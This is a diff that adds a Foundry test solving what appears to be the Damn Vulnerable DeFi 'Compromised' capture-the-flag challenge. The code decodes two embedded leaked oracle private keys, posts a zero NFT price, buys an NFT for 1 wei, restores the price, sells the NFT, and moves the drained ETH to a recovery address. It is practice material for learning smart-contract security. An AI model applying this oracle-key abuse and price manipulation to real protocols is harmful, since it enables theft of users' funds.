@@ -9,6 +9,10 @@ import {TrustfulOracle} from "../../src/compromised/TrustfulOracle.sol";
 import {TrustfulOracleInitializer} from "../../src/compromised/TrustfulOracleInitializer.sol";
 import {Exchange} from "../../src/compromised/Exchange.sol";
 import {DamnValuableNFT} from "../../src/DamnValuableNFT.sol";
+import {Strings2} from "../../lib/murky/differential_testing/test/utils/Strings2.sol";
+import {Base64} from "solady/utils/Base64.sol";
+import {Strings} from "../../lib/openzeppelin-contracts/contracts/utils/Strings.sol";
+import {SafeTransferLib} from "solady/utils/SafeTransferLib.sol";
 
 contract CompromisedChallenge is Test {
     address deployer = makeAddr("deployer");
@@ -75,7 +79,64 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        bytes memory pk1Base64 = hex"4d4867335a444531596d4a684d6a5a6a4e54497a4e6a677a596d5a6a4d32526a4e324e6b597a566b4d574934595449334e4451304e4463314f54646a5a6a526b595445334d44566a5a6a5a6a4f546b7a4d44597a4e7a5130";
+        bytes memory pk2Base64 = hex"4d4867324f474a6b4d444977595751784f445a694e6a5133595459354d574d325954566a4d474d784e5449355a6a49785a574e6b4d446c6b59324d304e5449304d5451774d6d466a4e6a426959544d334e324d304d545535";
+        uint256 pk1 = parsePkBase64(pk1Base64);
+        uint256 pk2 = parsePkBase64(pk2Base64);
+        address source1 = vm.addr(pk1);
+        address source2 = vm.addr(pk2);
+
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", 0);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", 0);
+
+        console.log(player);
+        vm.prank(player);
+        uint256 id = exchange.buyOne{value: 1 wei}();
+
+        vm.prank(source1);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+        vm.prank(source2);
+        oracle.postPrice("DVNFT", INITIAL_NFT_PRICE);
+
+        vm.startPrank(player);
+        nft.approve(address (exchange), id);
+        exchange.sellOne(id);
+        SafeTransferLib.safeTransferETH(recovery,INITIAL_NFT_PRICE);
+
+
+    }
+
+    function parsePkBase64(bytes memory base64) private pure returns(uint256){
+        bytes memory hexString = Base64.decode(string(base64));
+        // remove "0x"
+        assembly{
+            let length := mload(hexString)
+            hexString := add(hexString, 2)
+            mstore(hexString, sub(length, 2))
+        }
+        return hexStringToUint256(hexString);
+    }
+    /**
+     *  hex string in bytes, this param can be defined as "string memory hexString"
+     */
+    function hexStringToUint256(bytes memory hexString) private pure returns (uint256 result){
+        for(uint256 i = 0;i < hexString.length;i++){
+            uint256 char = uint256(uint8(hexString[i]));
+            uint256 value = hexCharToUint256(char);
+            result = (result << 4) + value;
+        }
+    }
+
+    function hexCharToUint256(uint256 char) private pure returns(uint256){
+        if (char > 47 && char < 58) {
+            return char - 48;
+        } else if (char > 96 && char < 103){
+            return char - 87;
+        } else {
+            revert('hex char invalid');
+        }
     }
 
     /**
